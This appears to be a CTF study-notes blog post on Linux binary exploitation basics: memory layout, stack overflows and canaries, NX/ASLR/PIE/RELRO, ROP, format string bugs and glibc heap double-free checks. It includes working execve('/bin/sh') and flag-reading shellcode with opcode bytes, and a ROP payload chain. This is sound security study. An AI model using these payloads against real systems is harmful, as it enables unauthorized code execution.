---
title: "System hacking basic"
date: 2025-11-18 01:41:18 +0900
categories: [CTF, Dreamhack, Pwnable]
tags: []
---

# System hacking basic

Reminding system hacking basic things. 

## Index
- [1. Linux Memory Layout](#linux-memory-layout)
- [2. Shell code](#shell-code)
- [3. Stack BOF](#stack-buffer-overflow)
- [4. NX & ASLR](#nx-aslr)
- [5. PIE & RELRO](#pie-relro)
- [6. Memory Corruption](#memory-corruption)
  - [6.1 Use After Free](#use-after-free-1)
  - [6.2 Double Free Bug](#double-free-bug)


## Linux Memory Layout
Linux: Divide process's memory into largely 5 segments -> (code, data, bss, heap, stack)

### Code
Segment for 'executable' machine code. Also known as Text Segment. <br>
Doesn't have execute capability in most cases. 

### Data 
Segment for global variables and constants whose values are already fixed during compile. <br>
Usually have read capability. Data segment is again divided into two segments: writable, nonwritable

Writable: data segment
Non writable: rodata segment 

### Bss
Segment for global variables and constants whose values are not fixed yet during compile.<br>
When program starts, this segment is initialized with zero.  <br>
Usually have 'read', 'write'.

### Stack
Segment for temporary variables such as parameter for functions and local variables.  <br>
Usually used in units called 'stack frames'. Grows toward 'low address'.

### Heap 
Segment for heap data. Dynamically allocated during runtime. <br>
Usually has 'read', 'write'. 

## Shell code
If attacker can controll rip, attacker can execute arbitrary assembly code. 

### ORW shell code

Bellow C code is pseudo code that shows what shell code does. 

```
char buf[0x30];

int fd = open("/tmp/flag", RD_ONLY, NULL);
read(fd, buf, 0x30); 
write(1, buf, 0x30);
```

| syscall | rax | arg0 (rdi)      | arg1 (rsi) | arg2 (rdx)    |
|---------|-----|-----------------|------------|---------------|
| read    | 0x0 | unsigned int fd | char *buf  | size_t count  |
| write   | 0x1 | unsigned int fd | char *buf  | size_t count  |
| open    | 0x2 | char *filename  | int flag   | umode_t mode  |

#### 1. int fd = open("/tmp/flag", RD_ONLY, NULL)
First, string "/tmp/flag" should be on the memory. -> push <br>
But, push operation works in units of 8 bytes. So, push 0x67, then push 0x616c662f706d742f. <br>

"/tmp/flag" in little endian: 0x67616c662f706d742f <br>

O_RDONLY = 0 -> set rsi 0 <br>
mode -> meaningless, set rdx 0 <br>
rax -> 0x2(open) <br>

```
push 0x67
mov rax, 0x616c662f706d742f 
push rax
mov rdi, rsp    ; rdi = "/tmp/flag"
xor rsi, rsi    ; rsi = 0 ; RD_ONLY
xor rdx, rdx    ; rdx = 0
mov rax, 2      ; rax = 2 ; syscall_open
syscall         ; open("/tmp/flag", RD_ONLY, NULL)
```

#### 2. read(fd, buf, 0x30)
File descriptor number obtained by 'open' goes to rax. So, 'mov rdi, rax' <br>
```
mov rdi, rax      ; rdi = fd
mov rsi, rsp
sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
mov rdx, 0x30     ; rdx = 0x30     ; len
mov rax, 0x0      ; rax = 0        ; syscall_read
syscall           ; read(fd, buf, 0x30)
```

#### 3. write(1, buf, 0x30)
standard output(stdout) -> set rdi 0x1 <br>
rsi, rdx stays same <br>

```
mov rdi, 1        ; rdi = 1 ; fd = stdout
mov rax, 0x1      ; rax = 1 ; syscall_write
syscall           ; write(fd, buf, 0x30)
```

How to compile into ELF 
```
// Compile: gcc -o orw orw.c -masm=intel

__asm__(
    ".global run_sh\n"
    "run_sh:\n"

    "push 0x67\n"
    "mov rax, 0x616c662f706d742f \n"
    "push rax\n"
    "mov rdi, rsp    # rdi = '/tmp/flag'\n"
    "xor rsi, rsi    # rsi = 0 ; RD_ONLY\n"
    "xor rdx, rdx    # rdx = 0\n"
    "mov rax, 2      # rax = 2 ; syscall_open\n"
    "syscall         # open('/tmp/flag', RD_ONLY, NULL)\n"
    "\n"
    "mov rdi, rax      # rdi = fd\n"
    "mov rsi, rsp\n"
    "sub rsi, 0x30     # rsi = rsp-0x30 ; buf\n"
    "mov rdx, 0x30     # rdx = 0x30     ; len\n"
    "mov rax, 0x0      # rax = 0        ; syscall_read\n"
    "syscall           # read(fd, buf, 0x30)\n"
    "\n"
    "mov rdi, 1        # rdi = 1 ; fd = stdout\n"
    "mov rax, 0x1      # rax = 1 ; syscall_write\n"
    "syscall           # write(fd, buf, 0x30)\n"
    "\n"
    "xor rdi, rdi      # rdi = 0\n"
    "mov rax, 0x3c	   # rax = sys_exit\n"
    "syscall		   # exit(0)");

void run_sh();

int main() { run_sh(); }
```

### execve shell code

Only uses execve systemcall: execve("/bin/sh",null,null) <br>

| syscall | rax  | arg0 (rdi)     | arg1 (rsi)      | arg2 (rdx)        |
|---------|------|----------------|-----------------|-------------------|
| execve  | 0x3b | char *filename | char *argv      | char *const *envp |

```
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp  ; rdi = "/bin/sh\x00"
xor rsi, rsi  ; rsi = NULL
xor rdx, rdx  ; rdx = NULL
mov rax, 0x3b ; rax = sys_execve
syscall       ; execve("/bin/sh", null, null)
```

### How to extract shell code

How to extract shellcode in the form of byte code(opcode) 

```
$ objdump -d shellcode.o
shellcode.o:     file format elf32-i386
Disassembly of section .text:
00000000 <_start>:
   0:	31 c0                	xor    %eax,%eax
   2:	50                   	push   %eax
   3:	68 2f 2f 73 68       	push   $0x68732f2f
   8:	68 2f 62 69 6e       	push   $0x6e69622f
   d:	89 e3                	mov    %esp,%ebx
   f:	31 c9                	xor    %ecx,%ecx
  11:	31 d2                	xor    %edx,%edx
  13:	b0 0b                	mov    $0xb,%al
  15:	cd 80                	int    $0x80
```

We can use xxd command 

```
$ objcopy --dump-section .text=shellcode.bin shellcode.o
$ xxd shellcode.bin
00000000: 31c0 5068 2f2f 7368 682f 6269 6e89 e331  1.Ph//shh/bin..1
00000010: c931 d2b0 0bcd 80                        .1.....
```

## Stack buffer overflow

buffer: temporary data storage <br>

Buffer overflow: happens when bigger data than the size of buffer goes into it.

### 1. modification of data

```
int check_auth(char *password) {
    int auth = 0;
    char temp[16];
    
    strncpy(temp, password, strlen(password));
    
    if(!strcmp(temp, "SECRET_PASSWORD"))
        auth = 1;
    
    return auth;
}
```

If 'password' is longer than 16 byte -> buffer overflow <br>

'auth' variable is located behind 'temp' buffer, so if an overflow occurs <br>
value of auth can be tampered.

### 2. Data leak

In C language, normal string terminates with null byte. <br>
If we can overwrite null byte using buffer overflow, it can lead to data leakage.

```
char secret[16] = "secret message";
char barrier[4] = {};
char name[8] = {};
memset(barrier, 0, 4);
printf("Your name: ");
read(0, name, 12);
printf("Your name is %s.", name);
```

### 3. Control flow manipulation

When caller calls callee, it pushes return address. When callee returns, it pops the return address and jumps. <br>
With buffer overflow, return address can be modified.

```
void win() {
    printf("You won!\n");
}

int main(void) {
    char buf[8];
    printf("Overwrite return address with %p:\n", &win);
    read(0, buf, 32);
    return 0;
}
```

buf + saved_rbp(8byte) + ret(8byte) -> can overwrite return address

### Stack Canary

Stack canary: Inserts random value between stack buffer and return address. In the function's epilogue, <br>
it checks for any modification of this value. If altered, process is terminated.

```
+  mov    rax,QWORD PTR fs:0x28
+  mov    QWORD PTR [rbp-0x8],rax
+  xor    eax,eax
+  lea    rax,[rbp-0x10]
-  lea    rax,[rbp-0x8]
   mov    edx,0x20
   mov    rsi,rax
   mov    edi,0x0
   call   read@plt
   mov    eax,0x0
+  mov    rcx,QWORD PTR [rbp-0x8]
+  xor    rcx,QWORD PTR fs:0x28
+  je     0x6f0 <main+70>
+  call   __stack_chk_fail@plt
```

### Canary dynamic analysis

#### Canary insertion

```
pwndbg> ni
   0x5555555546b2 <main+8>     mov    rax, qword ptr fs:[0x28] <0x5555555546aa>
   0x5555555546bb <main+17>    mov    qword ptr [rbp - 8], rax
 ► 0x5555555546bf <main+21>    xor    eax, eax
pwndbg> x/gx $rbp-0x8
0x7fffffffe238:	0xf80f605895da3c00
```

Fetch data from **fs:0x28** and save it to **rbp-0x8** <br>
 
fs: Linux uses fs(segment register) as a pointer to TLS(Thread Local Storage). <br>
TLS: Saves various data that are required when executing process(including canary)

#### Canary check

```
0x5555555546dc <main+50>    mov    rcx, qword ptr [rbp - 8] <0x7ffff7af4191>
0x5555555546e0 <main+54>    xor    rcx, qword ptr fs:[0x28]
0x5555555546e9 <main+63>    je     main+70 <main+70>
0x5555555546eb <main+65>    call   __stack_chk_fail@plt <__stack_chk_fail@plt>
```

xor two values: data from **rbp-0x8** and data from **fs:0x28** <br>
If the two values are not same: **__stack_chk_fail** and terminate 

### Canary bypass

#### TLS read, write

Address of TLS changes everytime. But, if approach to TLS is possible during runtime, reading canary value or <br>
overwriting canary is possible. 

#### Canary leak

```
int main() {
  char memo[8];
  char name[8];
  
  printf("name : ");
  read(0, name, 64);
  printf("hello %s\n", name);
  
  printf("memo : ");
  read(0, memo, 64);
  printf("memo %s\n", memo);
  return 0;
} 
```

**name** buffer overflow -> overwrite 1 byte(null byte) of canary -> canary leak <br>

With this canary value, overwriting name(8byte) + canary(8byte) + rbp(8byte) + ret(8byte) is possible

## NX & ASLR

### NX 

NX: No-eXecutable -> Seperates memory space for execution from memory space for write <br>

When NX is enabled..

```
         Start                End Perm     Size Offset File
      0x400000           0x401000 r--p     1000      0 /home/dreamhack/nx
      0x401000           0x402000 r-xp     1000   1000 /home/dreamhack/nx
      0x402000           0x403000 r--p     1000   2000 /home/dreamhack/nx
      0x403000           0x404000 r--p     1000   2000 /home/dreamhack/nx
      0x404000           0x405000 rw-p     1000   3000 /home/dreamhack/nx
0x7ffff7d7f000     0x7ffff7d82000 rw-p     3000      0 [anon_7ffff7d7f]
0x7ffff7d82000     0x7ffff7daa000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
0x7ffff7daa000     0x7ffff7f3f000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6
0x7ffff7f3f000     0x7ffff7f97000 r--p    58000 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6
0x7ffff7f97000     0x7ffff7f9b000 r--p     4000 214000 /usr/lib/x86_64-linux-gnu/libc.so.6
0x7ffff7f9b000     0x7ffff7f9d000 rw-p     2000 218000 /usr/lib/x86_64-linux-gnu/libc.so.6
```

No execution capability except code section

### ASLR

ASLR: Allocates stack, heap, shared library, etc into arbitrary memory address whenever binary is executed <br>

```
$ ./addr
buf_stack addr: 0x7ffcd3fcffc0
buf_heap addr: 0xb97260
libc_base addr: 0x7fd7504cd000
printf addr: 0x7fd750531f00
main addr: 0x400667
$ ./addr
buf_stack addr: 0x7ffe4c661f90
buf_heap addr: 0x176d260
libc_base addr: 0x7ffad9e1b000
printf addr: 0x7ffad9e7ff00
main addr: 0x400667
$ ./addr
buf_stack addr: 0x7ffcf2386d80
buf_heap addr: 0x840260
libc_base addr: 0x7fed2664b000
printf addr: 0x7fed266aff00
main addr: 0x400667
```

Address of every function except **main**(in code section) always changes. <br>
Lower 12 bits of the **libc_base** and **printf** address is not changed(due to paging of linux) <br>
Distance between **libc_base** and **printf** is always same. 

### Library

Library: enables sharing functions that are used often in common for efficiency <br>

### Link

Linking -> usually last step of compiling. If the program uses functions from library, those functions are actually linked to libary <br>

In linux, C code => preprocess, compilation, assembly => translated into ELF object file. 

```
gcc -c hello-world.c -o hello-world.o
```

object file has executable format, but doesn't have information about location of functions. <br>
In linkage procedure, linker matches symbols used in the program with actual defenitions. <br>

Dynamic linking: When binary is executed, dynamic library is mapped into process's memory. <br>
Static linking: Static linked binary includes all the functions of library -> doesn't need outer library 

### PLT & GOT

PLT(Procedure Linkage Table), GOT(Global Offset Table) -> Used to find dynamically linked symbol <br>
GOT -> table for address of **resolved** functions <br>

At first, GOT is empty -> PLT calls dynamic linker, write GOT with actual address <br>

### Return To Library

libc -> functions like system, execve exist <br>
Use libc function to bypass NX(section that has excute capability) <br>

Can overwrite return address like below 

```
addr of ("pop rdi; ret")   <= return address
addr of string "/bin/sh"   <= ret + 0x8
addr of "system" plt       <= ret + 0x10
```

### Return Oriented PRogramming

Technically speaking, **system** function will not be recorded on PLT. <br>
To use it, we need to find the address of mapped libc and calculate function's address <br>
<br>
Library file -> entire file is mapped -> all the functions are mapped on process memory <br>

```
# write(1, read_got, ...)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

# read(0, read_got, ...)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

# read("/bin/sh") == system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(ret)
payload += p64(read_plt)
```

## PIE & RELRO

### PIE

PIE(Position-Independant Executable): Apply ASLR on code section <br><br>

```
$ ./pie
buf_stack addr: 0x7ffc85ef37e0
buf_heap addr: 0x55617ffcb260
libc_base addr: 0x7f0989d06000
printf addr: 0x7f0989d6af00
main addr: 0x55617f1297ba
$ ./pie
buf_stack addr: 0x7ffe9088b1c0
buf_heap addr: 0x55e0a6116260
libc_base addr: 0x7f9172a7e000
printf addr: 0x7f9172ae2f00
main addr: 0x55e0a564a7ba
$ ./pie
buf_stack addr: 0x7ffec6da1fa0
buf_heap addr: 0x5590e4175260
libc_base addr: 0x7fdea61f2000
printf addr: 0x7fdea6256f00
main addr: 0x5590e1faf7ba
```
<br>
When PIE applied, to use code gadget or to access data section, we have to find code base(PIE base) <br>

### RELRO

RELRO(RELocation Read-Only): remove unnecessary write capability on data section <br><br>

Full RELRO: Only have write capability on **data** and **bss** <br>
When Full RELRO applied, all library functions are binded during binary loading 

### Hook Overwrite

In Glibc(before 2.33 ver), there are hook function pointer for **malloc** and **free** <br>

One-gadget -> Can execute shell with single gadget, but have to satisfy every constaint <br>

```
$ readelf -s /lib/x86_64-linux-gnu/libc-2.27.so | grep -E "__libc_malloc|__libc_free|__libc_realloc"
   463: 00000000000970e0   923 FUNC    GLOBAL DEFAULT   13 __libc_malloc@@GLIBC_2.2.5
   710: 000000000009d100    33 FUNC    GLOBAL DEFAULT   13 __libc_reallocarray@@GLIBC_PRIVATE
  1619: 0000000000098ca0  1114 FUNC    GLOBAL DEFAULT   13 __libc_realloc@@GLIBC_2.2.5
  1889: 00000000000979c0  3633 FUNC    GLOBAL DEFAULT   13 __libc_free@@GLIBC_2.2.5
  1994: 000000000019a9d0   161 FUNC    GLOBAL DEFAULT   14 __libc_freeres@@GLIBC_2.2.5
```

On libc, hook functions are defined for debugging purpose(removed for security reason on recent versions) <br>

**malloc** first check **__malloc_hook** and if exists, first execute function that hook points <br>

```
// __malloc_hook
void *__libc_malloc (size_t bytes)
{
  mstate ar_ptr;
  void *victim;
  void *(*hook) (size_t, const void *)
    = atomic_forced_read (__malloc_hook); // malloc hook read
  if (__builtin_expect (hook != NULL, 0))
    return (*hook)(bytes, RETURN_ADDRESS (0)); // call hook
#if USE_TCACHE
  /* int_free also calls request2size, be careful to not pad twice.  */
  size_t tbytes;
  checked_request2size (bytes, tbytes);
  size_t tc_idx = csize2tidx (tbytes);
  // ...
}
```

hooks are defined in libc.so

```
$ readelf -s /lib/x86_64-linux-gnu/libc-2.27.so | grep -E "__malloc_hook|__free_hook|__realloc_hook"
   221: 00000000003ed8e8     8 OBJECT  WEAK   DEFAULT   35 __free_hook@@GLIBC_2.2.5
  1132: 00000000003ebc30     8 OBJECT  WEAK   DEFAULT   34 __malloc_hook@@GLIBC_2.2.5
  1544: 00000000003ebc28     8 OBJECT  WEAK   DEFAULT   34 __realloc_hook@@GLIBC_2.2.5
```

These hooks are located at **bss**, **data** section -> can overwrite <br> <br>
When hook function are executed, parameter are passed together -> can execute like **malloc("/bin/sh")** <br>

## Memory corruption

### Out of Bounds

OOB: Occurs when index value is below zero or exceed array size <br>

OOB -> can lead to arbitrary read, write

### Format String Bug

Format specifier: %n, %c, %s.... <br>
%n: Calculate the number of printed characters <br>

hh: char size, h: short int size, l: long int sizez, ll: long long int size <br>

```
scanf("%s", format);
printf(format);
```

Then type **%p/%p/%p/%p/%p/%p/%p/%p**

```
$ ./fsb_stack_read
Format: %p/%p/%p/%p/%p/%p/%p/%p
0xa/(nil)/0x7f4dad0bbaa0/(nil)/0x55f04ffdc6b0/0x7025207025207025/0x2520702520702520/0x2070252070252070 
```

According to x64-64 convention, after rdi, **rsi, rdx, rcx, r8, r9, [rsp], [rsp+8], [rsp+0x10]** are printed. <br>

Using this... can perform arbitrary read, write <br>

read -> %[n]$s , write -> %[n]$n <br>

### Use After Free

#### ptmalloc2

ptmalloc2: Linux memory allocator <br>

Main Features: <br>
  1. Prevent memory waste
  2. Fast memory reuse
  3. Prevent Memory Fragmentation 

#### Chunk 

Chunk Structure

![Chunk Structure](/assets/img/posts/ctf-dreamhack-pwnable/chunk.png)
 
header of **in-use** chunk and **freed** chunk is different <br>

in-use chunk: does not use **fd**, **bk**. Use that area for data <br> 

| Name      | Size     | Meaning                                                                                                 |
|-----------|----------|---------------------------------------------------------------------------------------------------------|
| prev_size | 8 bytes  | Size of the immediately preceding (adjacent) chunk. Used to locate and merge with the previous chunk.   |
| size      | 8 bytes  | Size of the current chunk (including its header). In 64-bit systems, the header typically adds 16 bytes. |
| flags     | 3 bits   | Lower bits of `size` used for chunk management flags. Common flags: Allocated arena (A), Mmap’d (M), and Prev in use (P). |
| fd        | 8 bytes  | Points to the next chunk in the free list. Only present in freed chunks.                                 |
| bk        | 8 bytes  | Points to the previous chunk in the free list. Only present in freed chunks.                             |

#### Bin

bin: Object for storing used chunks, for memory waste prevention and fast reuse <br>

![bin structure](/assets/img/posts/ctf-dreamhack-pwnable/bin.png)

##### smallbin

**32 byte ~ 1024 byte**

Each smallbin contains same size of chunks. For each index, size of chunk gets bigger 16 bytes. smallbin[0]: 32, smallbin[61]:1008.. <br>

smallbin: circular doubly-linked list, **FIFO**. <br>

**unlink**: Procedure for adding or removing chunk from list <br>
 
In smallbin, when two adjacent chunks in memory are freed, they will be **merged** <br>

##### fastbin

**32 byte ~ 176 byte**

There are 10 fastbins. Linux only use 7(**32~128**). **LIFO**(no unlink, single linked list) <br>

Last freed chunk first allocated. No merge

##### largebin

**1024byte~**

doubly-linked list, **unlink**, There are 63 largebins. Merge happens 

##### unsortedbin

Only one. Chunks that does not go into fastbin all stored in unsortedbin. <br>

Unsortedbin: circular doubly-linked list <br>

When smallbin size chunk allocation requested: search fastbin, smallbin -> unsortedbin <br>

When largebin size chunk allocation requested: First search unsortedbin -> When searching unsortedbin... sort chunks to corresponding bins <br>

##### arena

arena: Object that holds information about fastbin, smallbin, largebin, etc. <br>

In glibc 2.26, tcache was additionally introduced. 

##### tcache

**32byte~1024byte**

tcache: thread local cache. Refers to a cache storage that is allocated independently for each thread. <br>

Each thread has 64 tcaches. **LIFO single linked list**. One tcache contains same size of chunk. In Linux, each tcache can contain up to 7 chunks. <br>

#### Use After Free

Use-After-Free: Not properly initialized freed pointer, Reallocating not initialized freed memory <br>

Dangling Pointer: Pointer that pointing invalid memory. When pointer not initialized, it becomes dangling pointer <br>

With dangling pointer, **Double free** can happen 

#### Double Free Bug

double free = Inserting same chunk in **free list** multiple time -> duplicated <br>

fd: next chunk, bk: previous chunk -> if fd, bk can be compromised, it can lead to arbitrary address read, write <br>

#### tcache DFB mitigation

tcache_entry, we can find **key** added in tcache_entry
```
typedef struct tcache_entry
{
  struct tcache_entry *next;
  /* This field exists to detect double frees.  */
  uintptr_t key;
} tcache_entry;
```

tcache_put: insert freed chunk into tcache. Set **e->key** into **tcache**(pointing tcache_perthread)
```
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);

  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache_key;

  e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```

tcache_get: A function used to allocate chunks stored in the tcache. Set **e->key** into NULL.
```
static __always_inline void *
tcache_get_n (size_t tc_idx, tcache_entry **ep)
{
  tcache_entry *e;
  if (ep == &(tcache->entries[tc_idx]))
    e = *ep;
  else
    e = REVEAL_PTR (*ep);

  if (__glibc_unlikely (!aligned_OK (e)))
    malloc_printerr ("malloc(): unaligned tcache chunk detected");

  if (ep == &(tcache->entries[tc_idx]))
      *ep = REVEAL_PTR (e->next);
  else
    *ep = PROTECT_PTR (ep, REVEAL_PTR (e->next));

  --(tcache->counts[tc_idx]);
  e->key = 0;
  return (void *) e;
}
```

tcache_free: When reallocated chunk's key is **tcache_key**, abort program
```
static inline bool
tcache_free (mchunkptr p, INTERNAL_SIZE_T size)
{
  bool done = false;
  size_t tc_idx = csize2tidx (size);
  if (tcache != NULL && tc_idx < mp_.tcache_bins)
    {
      /* Check to see if it's already in the tcache.  */
      tcache_entry *e = (tcache_entry *) chunk2mem (p);

      /* This test succeeds on double free.  However, we don't 100%
	 trust it (it also matches random payload data at a 1 in
	 2^<size_t> chance), so verify it's not an unlikely
	 coincidence before aborting.  */
      if (__glibc_unlikely (e->key == tcache_key))
	tcache_double_free_verify (e, tc_idx);

      if (tcache->counts[tc_idx] < mp_.tcache_count)
	{
	  tcache_put (p, tc_idx);
	  done = true;
	}
    }
  return done;
}
```
